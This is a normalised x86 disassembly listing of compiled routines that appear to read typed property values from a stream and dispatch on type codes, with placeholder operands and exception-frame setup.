mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4193e4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_416044
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41b6a8
lea eax [ ebp - 0x4 ]
call sub_406194
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_413200
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad35
lea eax [ ebp - 0x8 ]
call sub_40442c
lea eax [ ebp - 0x4 ]
call sub_406194
retn
sub_41ad3c
push ebp
mov ebp esp
push ecx
mov ecx 0x7
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b051
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b058
lea eax [ ebp - 0x3c ]
call sub_4053ac
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_404450
lea eax [ ebp - 0x24 ]
call sub_404b1c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404450
retn
jmp [ eax * 4 + jump_table_41adcc ]
mov eax [ rw-data ]
call sub_419938
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4127d0
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419e3c
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_419efc
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_412844
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41a6f8
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_412678
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_412844
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a5ec
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_412e18
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41b508
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_412b18
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41b5c4
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_412c2c
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b3ec
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_412844
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_419e3c
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419e3c
cmp al 0xd
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_41bdb8
lea ecx [ ebp - 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413064
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a864
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413144
jmp r-xdata
push ebp
call sub_41ac7c
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4127d0
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a7f8
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_412844
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41a6f8
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41abf4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b6a8
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_412844
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41a6f8
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b6a8
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4130e4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b6a8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4127d0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_419f54
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4130e4
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41a6f8
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41ac3c
pop ecx
jmp r-xdata
sub_41b060
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_404480
jmp r-xdata
mov eax [ ebx ]
call sub_415b9c
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_409730
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b0c0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b3db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b4a8
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
call sub_40d7e4
xor eax eax
push ebp
push sub_41b3b9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41b37a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41b4cc
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41b4cc
mov eax [ ebp - 0x1c ]
call sub_4156f4
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41b4cc
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_41b4cc
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41b060
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41b4cc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_403608
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_415444
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41b31f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_4067f8
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_416044
xor eax eax
push ebp
push sub_41b2ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4161fc
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b306
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4036c0
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4161a0
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41b350
call sub_4027d4
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403f08
jmp r-xdata
call sub_403eb4
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_419660
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b3c0
mov eax [ rw-data ]
call sub_40d8e4
retn
sub_41b37f
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_419808
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403eb4
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b3c0
mov eax [ rw-data ]
call sub_40d8e4
retn
mov eax [ ebp - 0xc ]
call sub_4036c0
sub_41b3ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b496
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41b469
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b6a8
cmp al 0xb
je r-xdata
mov eax ebx
call sub_41252c
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_419950
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_412678
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b49d
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b4cc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41b4cc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_419e60
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_40451c
mov eax esi
call j_sub_4048e8#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_419e60
pop edx
pop esi
pop ebx
retn
sub_41b508
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b5b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_419e3c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41b5c4
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4046ac
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b5bc
lea eax [ ebp - 0x8 ]
call sub_404b1c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41b6a8
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_419e60
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404a68
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_419e60
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_419e60
jmp r-xdata
jmp r-xdata
call sub_419950
sub_41b5c4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b69b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_419e3c
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41b508
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404c68
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b6a2
lea eax [ ebp - 0xc ]
call sub_40442c
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41b6a8
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_419e60
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404dc4
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_419e60
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_419e60
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404a68
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_419e60
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_40656c
jmp r-xdata
jmp r-xdata
call sub_419950
sub_41b6bc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41b6f8
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41b4cc
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b6ff
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_41b704
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_419af8
test al al
je r-xdata
mov eax [ ebx ]
call sub_41b7b8
mov eax [ ebx ]
call sub_41a8b0
pop ebx
pop ebp
retn
sub_41b72c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_419e60
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41bbb0
pop ebx
pop ecx
pop ebp
retn
sub_41b75c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_419af8
test al al
je r-xdata
mov eax [ ebx ]
call sub_419e3c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41a8b0
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41bbb0
jmp r-xdata
mov eax [ ebx ]
call sub_41b7b8
mov eax [ ebx ]
call sub_419af8
test al al
je r-xdata
mov eax [ ebx ]
call sub_41b954
mov eax [ ebx ]
call sub_41a8b0
sub_41b7b8
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41b947
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41b6a8
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b94e
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
jmp [ eax * 4 + jump_table_41b7ef ]
push ebp
call sub_41b704
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41bbb0
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41bbb0
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41bbb0
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41bbb0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b4cc
jmp r-xdata
push ebp
mov eax 0x1
call sub_41b72c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b6bc
jmp r-xdata
push ebp
mov eax 0x1
call sub_41b72c
pop ecx
jmp r-xdata
push ebp
call sub_41b75c
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41bbb0
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41bbb0
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41bbb0
jmp r-xdata
push ebp
mov eax 0x2
call sub_41b72c
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41bbb0
jmp r-xdata
push ebp
mov eax 0x1
call sub_41b72c
pop ecx
sub_41b954
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41b991
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41b4cc
mov eax ebx
call sub_41b7b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b998
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_41b99c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41ba34
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_419af8
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41b4cc
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41b4cc
jmp r-xdata
mov eax ebx
call sub_41b954
mov eax ebx
call sub_41a8b0
jmp r-xdata
mov eax ebx
call sub_419af8
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41b99c
mov eax ebx
call sub_41a8b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba3b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404450
retn
sub_41ba44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41bae9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4044c4
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41e6ac
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41baf0
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c098
call sub_403e8c
sub_41bb14
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41bb3c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_419d90
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_415634
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_4038ec
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_419d90
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41bbb0
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_419e60
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_419e60
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41bbf8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41bd9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_4199c4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41bd77
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_419e60
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_418964
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_419e60
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419298
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41bd52
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41b508
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_419e60
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_418964
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_419e60
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_412074
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
lea eax [ ebp - 0x1c ]
call sub_406194
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40daf0
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd59
mov eax [ ebp - 0xc ]
call sub_4036c0
retn
sub_41bdb8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bfa0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4052f4
mov eax [ ebp - 0x4 ]
call sub_419e3c
mov ebx eax
xor eax eax
mov al bl
cmp eax 0x13
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
jmp [ eax * 4 + jump_table_41bdfe ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfa7
lea eax [ ebp - 0x1c ]
call sub_4053ac
lea eax [ ebp - 0xc ]
call sub_404b1c
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
xor edx edx
mov dl bl
mov [ esi ] ax
mov eax [ ebp - 0x4 ]
call sub_41b6a8
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a7f8
mov [ esi + 0x8 ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a7f8
mov [ esi + 0x8 ] ax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a7f8
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a5ec
fstp [ esi + 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a62c
fstp [ esi + 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a66c
fistp [ esi + 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a6b8
fstp [ esi + 0x8 ]
fwait
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b508
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_405380
jmp r-xdata
lea edx [ ebp - 0xc ]
